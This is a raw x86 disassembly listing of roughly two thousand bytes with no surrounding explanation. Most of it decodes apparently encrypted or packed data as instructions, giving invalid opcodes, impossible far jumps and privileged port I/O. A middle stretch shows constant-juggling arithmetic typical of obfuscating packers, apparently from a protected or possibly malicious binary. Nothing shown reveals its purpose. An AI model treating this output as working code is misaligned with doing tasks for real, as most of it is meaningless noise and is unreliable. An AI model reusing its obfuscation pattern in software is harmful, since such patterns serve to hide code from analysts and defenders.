  40f8c4:	pop    edx
  40f8c5:	cld    
  40f8c6:	into   
  40f8c7:	xchg   edi,eax
  40f8c8:	(bad)  [ebp-0x73]
  40f8cb:	sbb    DWORD PTR [ecx+ecx*2],0x27427e03
  40f8d2:	sub    al,dl
  40f8d4:	sub    ah,BYTE PTR [eax]
  40f8d6:	jmp    0x40f866
  40f8d8:	push   es
  40f8d9:	aam    0x34
  40f8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8dc:	pop    edi
  40f8dd:	xchg   esp,eax
  40f8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8df:	pop    ebp
  40f8e0:	push   esi
  40f8e1:	lods   al,BYTE PTR ds:[esi]
  40f8e2:	mov    esi,0x3062ef7
  40f8e7:	ror    BYTE PTR [ebp+0x2d],0xb5
  40f8eb:	sbb    DWORD PTR [edx+0x1d22d201],edx
  40f8f1:	clc    
  40f8f2:	fcomp  QWORD PTR [ecx+0x6c0e1e32]
  40f8f8:	jbe    0x40f8b7
  40f8fa:	addr16 push eax
  40f8fc:	sbb    BYTE PTR [eax-0x26],bl
  40f8ff:	mov    esp,0x9ed384af
  40f904:	adc    al,0xf4
  40f906:	jns    0x40f91f
  40f908:	cmp    DWORD PTR [ecx-0xbb54d87],eax
  40f90e:	ds mov al,0x2a
  40f911:	mov    edi,0x4ba628eb
  40f916:	shl    ecx,1
  40f918:	sahf   
  40f919:	test   al,0x70
  40f91b:	or     al,0xc2
  40f91d:	call   0x4641:0xb83ce13a
  40f924:	or     ebp,DWORD PTR [ebx]
  40f926:	hlt    
  40f927:	pop    ss
  40f928:	cmp    ebp,ebx
  40f92a:	mov    cl,bh
  40f92c:	cmp    DWORD PTR [ebx+ecx*8+0x127ab536],0xfffffff0
  40f934:	cmp    al,0xcd
  40f936:	into   
  40f937:	cmp    eax,0x5a
  40f93a:	gs mov es,edi
  40f93d:	mov    ecx,0x7425cdd6
  40f942:	call   0xf4c7:0xe096
  40f948:	push   esi
  40f949:	imul   edi,DWORD PTR [eax+0x573d5ec2],0x69602f0c
  40f953:	push   ecx
  40f954:	test   eax,0x9f11ba89
  40f959:	jecxz  0x40f8e6
  40f95b:	in     eax,dx
  40f95c:	xor    bl,al
  40f95e:	inc    edx
  40f95f:	je     0x40f97b
  40f961:	xor    BYTE PTR [ebx],0xff
  40f964:	jecxz  0x40f95a
  40f966:	mov    esi,0x89be0924
  40f96b:	lea    edx,[esi+0x4a]
  40f96e:	ins    BYTE PTR es:[edi],dx
  40f96f:	jmp    0x40f9a6
  40f971:	mov    WORD PTR [ebx-0x352120d8],gs
  40f977:	pop    ebx
  40f978:	std    
  40f979:	test   eax,0x72cc3431
  40f97e:	or     DWORD PTR [ebp+ecx*1-0x64db3c83],esi
  40f985:	ret    
  40f986:	ret    0x50c3
  40f989:	call   0xf797735e
  40f98e:	xchg   esp,eax
  40f98f:	pop    esi
  40f990:	lods   eax,DWORD PTR ds:[esi]
  40f991:	mov    edi,0x5f3b1fb6
  40f996:	xor    DWORD PTR [edx+0xb],0x6861fb2f
  40f99d:	(bad)  
  40f99f:	daa    
  40f9a0:	cmp    dl,0xae
  40f9a3:	pop    esi
  40f9a4:	into   
  40f9a5:	outs   dx,BYTE PTR ds:[esi]
  40f9a6:	popa   
  40f9a7:	dec    esi
  40f9a8:	test   eax,0x98ce6f44
  40f9ad:	clc    
  40f9ae:	test   BYTE PTR [edi-0x4],0x8d
  40f9b2:	outs   dx,DWORD PTR ds:[esi]
  40f9b3:	lea    ebx,[edx+0x65]
  40f9b6:	jmp    0x7492ca4d
  40f9bb:	daa    
  40f9bc:	out    dx,eax
  40f9bd:	clc    
  40f9be:	push   ecx
  40f9bf:	clc    
  40f9c0:	xlat   BYTE PTR ds:[ebx]
  40f9c1:	scas   al,BYTE PTR es:[edi]
  40f9c2:	xor    esi,eax
  40f9c4:	add    eax,0x3a94eddf
  40f9c9:	and    dh,BYTE PTR [esp+eax*4-0x8]
  40f9cd:	push   es
  40f9ce:	push   ebx
  40f9cf:	ds pop es
  40f9d1:	sar    BYTE PTR [edi],0xd6
  40f9d4:	or     dh,BYTE PTR [eax]
  40f9d6:	dec    edi
  40f9d7:	nop
  40f9d8:	mov    al,ds:0x2d389c18
  40f9dd:	cmp    BYTE PTR [ebx-0x5b],0x4a
  40f9e1:	out    dx,eax
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x4220b1
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x2b35ce70]
  40fc87:	mov    esi,0x18189e76
  40fc8c:	mov    esi,0xa9181814
  40fc91:	jno    0x40fcf5
  40fc93:	div    BYTE PTR [edx]
  40fc95:	leave  
  40fc96:	xor    eax,0x66da79a5
  40fc9b:	mov    dh,0x96
  40fc9d:	inc    ecx
  40fc9e:	cmp    BYTE PTR [edx-0x6992a547],0x6b
  40fca5:	mov    dl,0xbb
  40fca7:	mov    ah,0x10
  40fca9:	(bad)  
  40fcaa:	fistp  QWORD PTR [ebx]
  40fcac:	sbb    DWORD PTR [ebp-0x183a009d],edi
  40fcb2:	jge    0x40fc9a
  40fcb4:	sbb    ch,al
  40fcb6:	jb     0x40fc6d
  40fcb8:	xor    BYTE PTR [eax-0x42],ch
  40fcbb:	retf   0x8f59
  40fcbe:	in     al,0xd8
  40fcc0:	cli    
  40fcc1:	lock adc ch,cl
  40fcc4:	(bad)  
  40fcc5:	push   esi
  40fcc6:	(bad)  
  40fcc7:	fiadd  WORD PTR ds:0xcbf572bf
  40fccd:	rcr    BYTE PTR [ebp+0x536fe7b1],0xad
  40fcd4:	es (bad) 
  40fcd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcd7:	push   eax
  40fcd8:	push   cs
  40fcd9:	int    0x9b
  40fcdb:	test   eax,0xaf91456
  40fce0:	inc    edx
  40fce1:	(bad)  
  40fce2:	pop    es
  40fce3:	cmp    al,0x46
  40fce5:	cmp    eax,0xcd0a5e65
  40fcea:	imul   esp,DWORD PTR [ecx+edi*4-0x42],0xed9c42fc
  40fcf2:	cmp    edx,0xffffffc6
  40fcf5:	cmp    bl,BYTE PTR [ebx]
  40fcf7:	dec    edx
  40fcf8:	retf   
  40fcf9:	ret    0x96d5
  40fcfc:	fidiv  WORD PTR [ebp+0x63]
  40fcff:	stos   DWORD PTR es:[edi],eax
  40fd00:	adc    al,0x93
  40fd02:	sub    dl,BYTE PTR [ecx]
  40fd04:	enter  0x2505,0x15
  40fd08:	cs jge 0x40fd73
  40fd0b:	in     al,0xbe
  40fd0d:	stos   BYTE PTR es:[edi],al
  40fd0e:	xchg   edi,eax
  40fd0f:	bound  ebp,QWORD PTR [edi+0x2]
  40fd12:	push   esi
  40fd13:	mov    ebx,0x128bb92d
  40fd18:	cmp    ch,ch
  40fd1a:	or     BYTE PTR ds:0x59081f04,dh
  40fd20:	repz fs cli 
  40fd23:	inc    esp
  40fd24:	mov    ebp,0x8d3f9d66
  40fd29:	inc    esp
  40fd2a:	xor    bh,BYTE PTR [ebx+0x70]
  40fd2d:	ret    0xe57a
  40fd30:	mov    bh,0xd
  40fd32:	mov    edx,0x1de8f35e
  40fd38:	cli    
  40fd39:	mov    ds:0x77902107,al
  40fd3e:	and    BYTE PTR [ebp+eax*4+0x35],cl
  40fd42:	fidiv  WORD PTR [ecx]
  40fd44:	cmc    
  40fd45:	sbb    bh,bl
  40fd47:	xor    edi,DWORD PTR [esi]
  40fd49:	inc    eax
  40fd4a:	das    
  40fd4b:	sbb    ah,dl
  40fd4d:	je     0x40fd62
  40fd4f:	push   edx
  40fd50:	in     eax,0x7a
  40fd52:	xor    eax,0x288ea0e9
  40fd57:	inc    ecx
  40fd58:	pop    eax
  40fd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd5a:	retf   0x5932
  40fd5d:	or     edx,DWORD PTR [ecx-0x66]
  40fd60:	fwait
  40fd61:	(bad)
  40fd64:	js     0x40fd99
  40fd66:	xchg   edi,eax
  40fd67:	adc    ebx,DWORD PTR [ebx+0x32939790]
  40fd6d:	xor    edx,edi
  40fd6f:	jne    0x40fdc9
  40fd71:	ret    
  40fd72:	(bad)  
  40fd73:	ror    BYTE PTR [ecx+0x52],cl
  40fd76:	imul   ecx,DWORD PTR [edx+0x55],0x48022286
  40fd7d:	xchg   eax,edx
  40fd7f:	das    
  40fd80:	xor    esi,eax
  40fd82:	mov    esp,DWORD PTR [eax]
  40fd84:	jl     0x40fdc9
  40fd86:	pop    ss
  40fd87:	addr16 (bad) 
  40fd89:	xchg   edx,eax
  40fd8a:	aam    0xaf
  40fd8c:	xlat   BYTE PTR ds:[ebx]
  40fd8d:	xor    dh,BYTE PTR [esi+0x1754682a]
  40fd93:	push   ebx
  40fd94:	or     dl,dh
  40fd96:	xor    al,0x2c
  40fd98:	out    dx,al
  40fd99:	das    
  40fd9a:	test   bh,dh
  40fd9c:	ja     0x40fd8e
  40fd9e:	mov    edi,0x2b873869
  40fda3:	cld    
  40fda4:	push   edx
  40fda5:	lea    esi,[ebx+eax*4+0x75103e1b]
  40fdac:	or     BYTE PTR ds:0x4c46cf33,0x18
  40fdb3:	cwde   
  40fdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdb5:	dec    ecx
  40fdb6:	mov    ecx,0x9305189e
  40fdbb:	scas   eax,DWORD PTR es:[edi]
  40fdbc:	call   0x81d1:0x8facba31
  40fdc3:	mov    esp,0x1194f3be
  40fdc8:	mov    ch,0x14
  40fdca:	int3   
  40fdcb:	jmp    0xfff8:0xa7b769b2
  40fdd2:	mov    esp,0x1e54f607
  40fdd7:	test   BYTE PTR [ebx+eiz*1+0x50],bl
  40fddb:	dec    eax
  40fddc:	xor    esp,eax
  40fdde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fddf:	add    ecx,edi
  40fde1:	adc    DWORD PTR [esi+0x7c],eax
  40fde4:	sbb    cl,BYTE PTR [edi+0x50]
  40fde7:	std    
  40fde8:	pop    edi
  40fde9:	in     eax,0xb
  40fdeb:	mov    al,ds:0x5501dbf4
  40fdf0:	in     eax,0xec
  40fdf2:	imul   ebx,DWORD PTR [ecx-0x61],0x45
  40fdf6:	xchg   edx,eax
  40fdf7:	mov    al,0xc5
  40fdf9:	mov    dh,0x68
  40fdfb:	inc    ecx
  40fdfc:	mov    eax,0x96728a11
  40fe01:	push   ebp
  40fe02:	stos   DWORD PTR es:[edi],eax
  40fe03:	ja     0x40fd9d
  40fe05:	sub    al,0x51
  40fe07:	out    0x50,al
  40fe09:	xchg   edi,eax
  40fe0a:	inc    edi
  40fe0b:	push   esp
  40fe0c:	sbb    eax,0x744ac6bd
  40fe11:	xchg   ebp,eax
  40fe12:	rcl    BYTE PTR [ecx-0x5fc56248],0x90
  40fe19:	xchg   esi,eax
  40fe1a:	add    ah,bh
  40fe1c:	rol    BYTE PTR [eax+esi*2-0x2d],0x56
  40fe21:	repnz adc eax,0xfacf9656
  40fe27:	es jge 0x40fe34
  40fe2a:	mov    bl,0xce
  40fe2c:	jge    0x40fe65
  40fe2e:	js     0x2e4377cb
  40fe34:	retf   
  40fe35:	(bad)  
  40fe36:	fnstsw WORD PTR [eax-0x7d5b3d08]
  40fe3c:	lock das 
  40fe3e:	lock or al,0x7e
  40fe41:	fucom  st(5)
  40fe43:	adc    ah,BYTE PTR [esi-0x36]
  40fe46:	or     esi,edx
  40fe48:	jo     0x40fe73
  40fe4a:	test   ecx,edi
  40fe4c:	push   ebx
  40fe4d:	xchg   BYTE PTR [esi],ch
  40fe4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe50:	and    al,0x86
  40fe52:	(bad)  [edi-0x62]
  40fe55:	jge    0x40fea2
  40fe57:	pop    es
  40fe58:	xchg   ebp,eax
  40fe59:	test   dh,ch
  40fe5b:	(bad)
  40fe5e:	ret    0x1f99
  40fe61:	dec    ecx
  40fe62:	je     0x40feb0
  40fe64:	pop    esp
  40fe65:	jecxz  0x40fe68
  40fe67:	mov    ebx,DWORD PTR [ebx-0x52]
  40fe6a:	xor    BYTE PTR [ebp-0x79bcfd02],cl
  40fe70:	mov    es,WORD PTR [edx]
  40fe72:	xlat   BYTE PTR ds:[ebx]
  40fe73:	jno    0x40fe27
  40fe75:	dec    esi
  40fe76:	xchg   edx,eax
  40fe77:	daa    
  40fe78:	dec    edx
  40fe79:	int    0xa8
  40fe7b:	(bad)  
  40fe7c:	mov    eax,0x149dd8d5
  40fe81:	cmp    eax,0x7c39c3dd
  40fe86:	fdivr  st,st(4)
  40fe88:	(bad)  
  40fe89:	xor    BYTE PTR [esi+0x6f],ah
  40fe8c:	dec    esi
  40fe8d:	inc    edx
  40fe8e:	inc    ecx
  40fe8f:	pop    ss
  40fe90:	rol    DWORD PTR [edi-0x11],1
  40fe93:	cmp    BYTE PTR [edi-0x66cda45e],ch
  40fe99:	pop    es
  40fe9a:	mov    ah,0x31
  40fe9c:	push   ebx
  40fe9d:	push   esi
  40fe9e:	adc    eax,0xf2f6d02c
  40fea3:	jnp    0x40feef
  40fea5:	rcl    dl,1
  40fea7:	jb     0x40fe99
  40fea9:	mov    ds:0x7bfb5b20,eax
  40feae:	mov    ebx,0xeddc9dbc
  40feb3:	jg     0x40fe77
  40feb5:	xchg   ebp,eax
  40feb6:	add    DWORD PTR [ecx-0x72],edx
  40feb9:	push   ds
  40feba:	add    BYTE PTR [edi+0x57],al
  40febd:	xor    al,0x6e
  40febf:	push   ebp
  40fec0:	out    dx,al
  40fec1:	test   eax,eax
  40fec3:	mov    dl,0xac
  40fec5:	(bad)  
  40fec7:	add    eax,ebp
  40fec9:	das    
  40feca:	pop    ss
  40fecb:	mov    WORD PTR [ebp+0x0],ds
  40fece:	cmp    dh,BYTE PTR [edi+0x6d]
  40fed1:	mov    WORD PTR [edi],cs
  40fed3:	jle    0x40fe68
  40fed5:	or     DWORD PTR [edi+edx*8],0x8ec2b97e
  40fedc:	dec    esp
  40fedd:	inc    edi
  40fede:	shl    BYTE PTR [esi],0x32
  40fee1:	fist   WORD PTR [ebx]
  40fee3:	xor    eax,0xebb88690
  40fee8:	mov    fs,WORD PTR [esi+0x3a20c135]
  40feee:	call   0x957c66ee
  40fef3:	sti    
  40fef4:	popa   
  40fef5:	xchg   ebp,eax
  40fef6:	pop    es
  40fef7:	je     0x40fec9
  40fef9:	fst    QWORD PTR [eax-0x71]
  40fefc:	ret    0x58dd
  40feff:	icebp  
  40ff00:	outs   dx,DWORD PTR ds:[esi]
  40ff01:	sub    BYTE PTR [edx],cl
  40ff03:	cmp    al,0x9d
  40ff05:	ret    0x1197
  40ff08:	adc    dl,bl
  40ff0a:	mov    edx,0x4c61f12
  40ff0f:	pop    esi
  40ff10:	xchg   ebp,eax
  40ff11:	dec    edx
  40ff12:	(bad)  
  40ff14:	jmp    0x4c6b7f9a
  40ff19:	cld    
  40ff1a:	push   edx
  40ff1b:	test   BYTE PTR [ebx],ah
  40ff1d:	mov    ecx,0x14563650
  40ff22:	sbb    ecx,DWORD PTR [eax+0x79]
  40ff25:	sub    ch,bl
  40ff27:	enter  0x6490,0xa
  40ff2b:	out    0x60,eax
  40ff2d:	dec    ecx
  40ff2e:	sub    al,BYTE PTR [edx+0xf40a572]
  40ff34:	jge    0x40ff2c
  40ff36:	mov    bl,0x60
  40ff38:	and    eax,0x39763324
  40ff3d:	sub    ah,BYTE PTR [esi+0x51]
  40ff40:	inc    ebp
  40ff41:	add    eax,0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0x5838c47]
  40ff68:	fcom   DWORD PTR [ecx+0x18981d70]
  40ff6e:	sbb    BYTE PTR [esi-0x8e7e7ec],bh
  40ff74:	(bad)  
  40ff76:	cs push ebp
  40ff78:	jl     0x40ff50
  40ff7a:	sub    ch,ah
  40ff7c:	pop    edx
  40ff7d:	cmc    
  40ff7e:	ror    BYTE PTR [eax+0x4c05f964],cl
  40ff84:	push   ss
  40ff85:	jge    0x40ff26
  40ff87:	js     0x40fffc
  40ff89:	leave  
  40ff8a:	add    BYTE PTR [eax-0x30f0c915],bh
  40ff90:	push   edx
  40ff91:	jg     0x40ffe4
  40ff93:	cdq    
  40ff94:	aas    
  40ff95:	imul   edx,DWORD PTR [eax+0x156f5d24],0xffffff8d
  40ff9c:	xor    esp,DWORD PTR [eax+0x6139e74c]
  40ffa2:	sbb    esi,DWORD PTR [ebx-0x4c]
  40ffa5:	mov    ds:0x47b4605f,eax
  40ffaa:	cmp    edi,DWORD PTR [edi]
  40ffac:	or     edx,DWORD PTR [ebx+0x3f]
  40ffaf:	imul   esp,DWORD PTR [edi],0xffffffd8
  40ffb2:	xlat   BYTE PTR ds:[ebx]
  40ffb3:	lahf   
  40ffb4:	(bad)  
  40ffb6:	push   ebx
  40ffb7:	adc    al,0x9a
  40ffb9:	cmc    
  40ffba:	(bad)  
  40ffbb:	jmp    0x29fc9611
  40ffc0:	inc    ecx
  40ffc1:	sub    ecx,edi
  40ffc3:	gs jne 0x410038
  40ffc6:	lods   eax,DWORD PTR ds:[esi]
  40ffc7:	bound  esp,QWORD PTR [edx+edx*2]
  40ffca:	ficomp WORD PTR [ebp-0x10]
  40ffcd:	adc    al,0x24
  40ffcf:	mov    esi,0xb5ec936e
  40ffd4:	push   ebx
  40ffd5:	push   esp
  40ffd6:	sbb    esi,DWORD PTR es:[edi+0x6e]
  40ffda:	xchg   BYTE PTR [esi-0x3f],dh
  40ffdd:	fistp  WORD PTR [ebp+0x2748025]
  40ffe3:	mov    bl,0xb0
  40ffe5:	aad    0xec
  40ffe7:	pop    eax
  40ffe8:	jge    0x40fff3
  40ffea:	mov    ebx,0x8f04d3f0
  40ffef:	popa   
  40fff0:	adc    BYTE PTR [edx-0x61],bh
  40fff3:	mov    bl,0x81
  40fff5:	pusha  
  40fff6:	pop    ecx
  40fff7:	into   
  40fff8:	and    DWORD PTR [ebx],edx
  40fffa:	stc    
  40fffb:	cli    
  40fffc:	scas   eax,DWORD PTR es:[edi]
  40fffd:	mov    eax,0x774a9aa9
  410002:	popa   
  410003:	in     al,0x24
  410005:	out    dx,eax
  410006:	mov    al,ch
  410008:	not    DWORD PTR [esi]
  41000a:	adc    al,0x74
  41000c:	fisttp WORD PTR [ebx]
  41000e:	out    dx,eax
  41000f:	push   ebx
  410010:	in     eax,0x95
  410012:	das    
  410013:	dec    edi
  410014:	push   eax
  410015:	inc    esi
  410016:	loopne 0x40ffc2
  410018:	xchg   esp,eax
  410019:	ret    
  41001a:	pop    edi
  41001b:	dec    edi
  41001c:	mov    ecx,0x2fc12b24
  410021:	inc    ebp
  410022:	jnp    0x410057
  410024:	pop    edi
  410025:	and    esp,edi
  410027:	jecxz  0x4100a8
  410029:	mov    esi,0xf004b3c2
  41002e:	cld    
  41002f:	or     eax,0xd4e0014
  410034:	and    BYTE PTR [edx-0x1e],0xff
  410038:	dec    esi
  410039:	je     0x410067
  41003b:	test   BYTE PTR [ebx-0x67],0xba
  41003f:	add    BYTE PTR [esi],al
  410041:	jmp    0x4f65:0xadc99a5b
  410048:	xchg   ecx,eax
  410049:	sbb    bl,bh
  41004b:	pop    eax
  41004c:	mov    ecx,0xc1e8d2d
  410051:	inc    ebx
  410052:	cdq    
  410053:	inc    esi
  410054:	daa    
  410055:	imul   ecx,DWORD PTR [ecx+0x18ed9251],0x48
  41005c:	mov    ecx,0x4c72373f
  410061:	std    
  410062:	popf   
  410063:	int    0x26
  410065:	sahf   
  410066:	scas   eax,DWORD PTR es:[edi]
  410067:	dec    edi
  410068:	push   ecx
  410069:	jp     0x41008f
  41006b:	(bad)  
  41006c:	mov    bh,0x1c
  41006e:	jle    0x410063
  410070:	in     eax,0xf4
  410072:	cmp    eax,0x549fc1f6
  410077:	mov    BYTE PTR [esi-0x53b9d9a4],cl
  41007d:	push   ecx
  41007e:	xchg   BYTE PTR [ebp+ecx*2+0x36],al
  410082:	sub    BYTE PTR [edi+0x2f],bl
  410085:	add    eax,0x24d9513b
  41008a:	shl    BYTE PTR [eax-0x6d],cl
  41008d:	xor    eax,0x6d84ebee
  410092:	shl    BYTE PTR [ebx],0x9
  410095:	dec    edx
  410096:	xchg   ebp,eax
  410097:	fwait
  410098:	not    DWORD PTR [ebp+ecx*8+0x1e750969]
  41009f:	sub    ah,ah
  4100a1:	imul   esp,DWORD PTR [esi],0xb1c899d
  4100a7:	jge    0x4100bc
  4100a9:	(bad)  
  4100aa:	xor    BYTE PTR [edi],bh
  4100ac:	stc    
  4100ad:	jge    0x4100f4
  4100af:	call   0xefca7ef5
  4100b4:	xor    al,0xbc
  4100b6:	add    edi,ebp
  4100b8:	mov    ds:0x9d448d9,eax
  4100bd:	es sti 
  4100bf:	cld    
  4100c0:	popa   
  4100c1:	push   0xf23d9c5f
  4100c6:	and    ah,BYTE PTR ds:[ebx]
  4100c9:	jg     0x410138
  4100cb:	aas    
  4100cc:	dec    eax
  4100cd:	push   ecx
  4100ce:	adc    BYTE PTR [esi-0x6b47cb01],cl
  4100d4:	mov    dh,0xa0
  4100d6:	daa    
  4100d7:	pop    eax
  4100d8:	jl     0x410070
  4100da:	ss dec eax
  4100dc:	sbb    ah,BYTE PTR [eax]
  4100de:	jno    0x410115
  4100e0:	mov    dh,0x42
  4100e2:	mov    al,0x4f
  4100e4:	add    eax,DWORD PTR [esp+eax*1+0x3bf3e379]
  4100eb:	cmp    cl,dl
  4100ed:	jge    0x410076
  4100ef:	mov    ecx,DWORD PTR [eax]
  4100f1:	xor    al,0xbe
  4100f3:	adc    al,0xe8
